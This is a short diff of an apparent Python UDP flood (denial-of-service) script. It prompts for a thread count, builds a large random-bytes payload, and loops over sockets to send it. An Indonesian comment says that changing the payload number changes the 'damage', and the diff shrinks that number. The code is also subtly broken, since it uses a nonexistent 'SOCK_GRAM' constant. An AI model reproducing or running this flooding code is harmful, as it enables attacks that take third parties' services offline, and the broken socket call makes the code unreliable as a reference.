@@ -14,7 +14,7 @@ threads_wibu = int(input("Thread Dari Wibu : "))
 os.system("clear")
 
 def wibu():
-    asu = random._urandom(999999999999999999)#ubah angka urandom= damage
+    asu = random._urandom(999999)#ubah angka urandom= damage
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
